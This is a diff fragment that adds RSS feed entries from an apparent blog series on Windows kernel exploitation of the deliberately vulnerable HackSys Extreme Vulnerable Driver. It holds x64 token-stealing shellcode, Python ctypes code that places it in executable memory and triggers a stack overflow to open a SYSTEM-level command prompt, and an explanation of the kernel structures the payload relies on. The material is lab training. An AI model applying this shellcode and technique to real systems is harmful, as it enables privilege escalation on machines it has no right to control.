+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x8B\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                            &lt;span class=&quot;c&quot;&gt;#    mov rcx, [rcx]       ;NO - load next entry in list&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xEB\xF1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                &lt;span class=&quot;c&quot;&gt;#    jmp find_system      ;loop&lt;/span&gt;
+                                                  &lt;span class=&quot;c&quot;&gt;#found_system:&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x8B\x81\x80\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;#    mov rax, [rcx+80h]   ;offset to token&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x24\xF0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                &lt;span class=&quot;c&quot;&gt;#    and al, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure&lt;/span&gt;
+                                                  &lt;span class=&quot;c&quot;&gt;#find_cmd:&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x8B\x51\xF8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                        &lt;span class=&quot;c&quot;&gt;#    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x81\xFA&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;#    cmp rdx, ZZZZ        ;UniqueProcessId == ZZZZ? (PLACEHOLDER)&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x74\x05&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                &lt;span class=&quot;c&quot;&gt;#    jz found_cmd         ;YES - move on&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x8B\x09&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                            &lt;span class=&quot;c&quot;&gt;#    mov rcx, [rcx]       ;NO - next entry in list&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xEB\xEE&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                                &lt;span class=&quot;c&quot;&gt;#    jmp find_cmd         ;loop&lt;/span&gt;
+                                                  &lt;span class=&quot;c&quot;&gt;#found_cmd:&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x89\x81\x80\x00\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;#    mov [rcx+80h], rax   ;copy SYSTEM token over top of this process&#39;s token&lt;/span&gt;
+                                                  &lt;span class=&quot;c&quot;&gt;#return:&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x48\x83\xC4\x28&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;                        &lt;span class=&quot;c&quot;&gt;#    add rsp, 28h         ;HEVD+0x61ea&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xC3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                   &lt;span class=&quot;c&quot;&gt;#    ret&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We will utilize the &lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx&quot;&gt;VirtualAlloc&lt;/a&gt; function to give us an area we can copy our shellcode into. The function prototype is pretty self explanatory. Obviously we’ll want to be sure to specify that the allocation is executable. Assuming everything goes fine with the allocation, we can copy the shellcode into the buffer (ctypes provides a memmove() function) and then return back the address where the shellcode now resides:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*]Allocating buffer for shellcode...&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dwSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokenstealing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;flAllocationType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MEM_COMMIT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_RESERVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;flProtect&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lpAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# _In_opt_  LPVOID&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;dwSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;# _In_      SIZE_T&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;flAllocationType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;# _In_      DWORD&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;flProtect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# _In_      DWORD&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-]Error allocating shellcode: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+]Shellcode buffer allocated at: 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;
+    
+    &lt;span class=&quot;c&quot;&gt;# put de shellcode in de buffer and shake it all up&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tokenstealing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokenstealing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;And that’s that!&lt;/p&gt;
+
+&lt;h4 id=&quot;step-five---create-evil-buffer&quot;&gt;Step five - create evil buffer&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Spawn cmd.exe process&lt;/li&gt;
+    &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+    &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+    &lt;li&gt;Allocate buffer with shellcode&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Create a buffer that redirects execution into shellcode &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+    &lt;li&gt;Trigger the vulnerable code&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This step is again pretty similar to the DoS PoC. This time our function needs to also receive the address of the allocation where the shellcode now resides so that we can add it to our buffer. Our DoS PoC buffer was made up of 2048 “A”’s followed by 8 “B”’s and 8 “C”’s. The “C”’s were what ended up in the rip register so we want to replace that with our shellcode address. Here’s how it looks:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;n&quot;&gt;inBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2056&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;step-six---trigger-the-vulnerability&quot;&gt;Step six - trigger the vulnerability&lt;/h4&gt;
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;Spawn cmd.exe process&lt;/li&gt;
+    &lt;li&gt;Get a handle to the vulnerable device&lt;/li&gt;
+    &lt;li&gt;Get the correct IOCTL for the stack overflow function&lt;/li&gt;
+    &lt;li&gt;Allocate buffer with shellcode&lt;/li&gt;
+    &lt;li&gt;Create a buffer that redirects execution into shellcode&lt;/li&gt;
+    &lt;li&gt;&lt;strong&gt;Trigger the vulnerable code &amp;lt;——&lt;/strong&gt;&lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We’re almost home-free now! This is pretty much the same as the DoS PoC as well. The only differences are that we first spawn cmd.exe and get it’s PID, then allocate our shellcode and insert that address into our evil buffer.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwIoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;Create evil buffer and send IOCTL&quot;&quot;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;inBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_string_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2056&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;scAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*]Triggering vulnerable IOCTL...&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpInBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addressof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nInBufferSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# ignore terminating \x00&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpOutBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;nOutBufferSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpBytesReturned&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_ulong&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lpOverlapped&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;pwnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;# _In_        HANDLE&lt;/span&gt;
+                           &lt;span class=&quot;n&quot;&gt;dwIoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# _In_        DWORD&lt;/span&gt;
+                           &lt;span class=&quot;n&quot;&gt;lpInBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;# _In_opt_    LPVOID&lt;/span&gt;
+                           &lt;span class=&quot;n&quot;&gt;nInBufferSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;# _In_        DWORD&lt;/span&gt;
+                           &lt;span class=&quot;n&quot;&gt;lpOutBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;# _Out_opt_   LPVOID&lt;/span&gt;
+                           &lt;span class=&quot;n&quot;&gt;nOutBufferSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;# _In_        DWORD&lt;/span&gt;
+                           &lt;span class=&quot;n&quot;&gt;lpBytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;c&quot;&gt;# _Out_opt_   LPDWORD&lt;/span&gt;
+                           &lt;span class=&quot;n&quot;&gt;lpOverlapped&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# _Inout_opt_ LPOVERLAPPED&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-]Error: Not pwnd :(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FormatError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;**HackSys Extreme Vulnerable Driver**&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;***Stack buffer overflow exploit***&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;procreate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;trigger&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ctl_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# ugly lol&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;And if all goes well…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hevd4-ss1.jpg&quot; alt=&quot;pwnd&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Booyah! The final code for the exploit is available &lt;a href=&quot;https://github.com/sizzop/sizzop.github.io/code/HEVD-stackbof-win7x64.py&quot;&gt;here&lt;/a&gt;. The next blog post will involve porting this exploit to Windows 8.1 x64 where we have to work around SMEP mitigation baked into the kernel.&lt;/p&gt;
+</description>
+        <pubDate>Fri, 08 Jul 2016 00:00:00 -0400</pubDate>
+        <link>https://sizzop.github.io/2016/07/08/kernel-hacking-with-hevd-part-4.html</link>
+        <guid isPermaLink="true">https://sizzop.github.io/2016/07/08/kernel-hacking-with-hevd-part-4.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Kernel Hacking With HEVD Part 3 - The Shellcode</title>
+        <description>&lt;p&gt;In the &lt;a href=&quot;/2016/07/06/kernel-hacking-with-hevd-part-2.html&quot;&gt;last blog entry&lt;/a&gt; in this series we got to the point where we have crashed the kernel in a controlled manner. This is a good spot to be in! But it would be better if we used this situation to escalate privileges instead of just looking at our pretty blue screen. Let’s talk kernel payloads.&lt;/p&gt;
+
+&lt;h4 id=&quot;token-stealing&quot;&gt;Token Stealing&lt;/h4&gt;
+&lt;p&gt;The end goal of this exploit is to have a command prompt open with SYSTEM level access. Once you have control of execution in ring 0 there are many options for getting to that end goal but one of the most popular seems to be token stealing. The Windows security model is complicated (to say the least), but here are some drastically over-simplified basics to get us started.&lt;/p&gt;
+
+&lt;p&gt;In Windows, everything can be thought of as an object (including processes, files, tokens, etc.) Every object has a security descriptor that specifies which entities can perform certain activities on the object. Each entity is identified by a token. The SYSTEM token has full authority to perform any activity on any object. Therefore if you can get the SYSTEM token and copy it over top of your less privileged token, then you gain full access to everything. It’s kinda like cutting out a picture of the president’s face and name and pasting it onto your ID badge.&lt;/p&gt;
+
+&lt;p&gt;To make this magic happen we have to use our stack buffer overflow to redirect driver execution into an area of memory containing our special token-swapping shellcode. This of course requires allocating some executable memory and copying our shellcode into it first before triggering our overflow. Turns out you can’t just use &lt;code class=&quot;highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; to dump out some copy/paste kernel shellcode so we must innovate!&lt;/p&gt;
+
+&lt;p&gt;In order to craft our shellcode we have to know a bit about some of the data structures and members that we’re going to be dealing with. These data structures will help us get from a static location to the process tokens that we want to swap so they’re worth knowing about. Let’s briefly talk about each in turn.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;KPCR&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Windows defines a Kernel Processor Control Region (KPCR) which stores information about the processor. This is useful to us because it is always available at &lt;code class=&quot;highlighter-rouge&quot;&gt;gs:[0]&lt;/code&gt; which is handy when you’re creating position independent code. Here’s what the structure looks like on Windows 7 x64 (abridged):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; dt nt!_KPCR
+   +0x000 NtTib            : _NT_TIB
+   +0x000 GdtBase          : Ptr64 _KGDTENTRY64
+   +0x008 TssBase          : Ptr64 _KTSS64
+   +0x010 UserRsp          : Uint8B
+   +0x018 Self             : Ptr64 _KPCR
+   +0x020 CurrentPrcb      : Ptr64 _KPRCB
+   ...
+   +0x118 PcrAlign1        : [24] Uint4B
+   +0x180 Prcb             : _KPRCB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;There’s some interesting stuff in there but the main thing we’re concerned with is the last item in the list, the KPCR.Prcb which is a KPRCB structure.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;KPRCB&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;From the KPCR we can get the Kernel Processor Control Block (KPRCB). We care about this because it gives us the location of the KTHREAD structure for the thread that the processor is executing. This structure is pretty huge so I’m just including the first eight lines here:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; dt nt!_KPRCB
+   +0x000 MxCsr            : Uint4B
+   +0x004 LegacyNumber     : UChar
+   +0x005 ReservedMustBeZero : UChar
+   +0x006 InterruptRequest : UChar
+   +0x007 IdleHalt         : UChar
+   +0x008 CurrentThread    : Ptr64 _KTHREAD
+   +0x010 NextThread       : Ptr64 _KTHREAD
+   +0x018 IdleThread       : Ptr64 _KTHREAD
+   ...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Since the KPRCB.CurrentThread member is what we’re after here and we know it’s at &lt;code class=&quot;highlighter-rouge&quot;&gt;gs:[0]&lt;/code&gt;+ 180 + 8 we can put on our advanced mathematics pants and safely say that &lt;code class=&quot;highlighter-rouge&quot;&gt;gs:[188]&lt;/code&gt; contains a pointer to a KTHREAD structure representing the currently executing thread. Remember this for later!&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;KTHREAD&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The KTHREAD structure is the first part of the larger ETHREAD structure and maintains some low-level information about the currently executing thread. There’s lots of info in there but the main thing we’re concerned about for our purposes is the KTHREAD.ApcState member which is a KAPC_STATE structure. Here’s an abridged view of the KTHREAD structure:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0: kd&amp;gt; dt nt!_KTHREAD
+   +0x000 Header           : _DISPATCHER_HEADER
+   +0x018 CycleTime        : Uint8B
+   +0x020 QuantumTarget    : Uint8B
+   +0x028 InitialStack     : Ptr64 Void
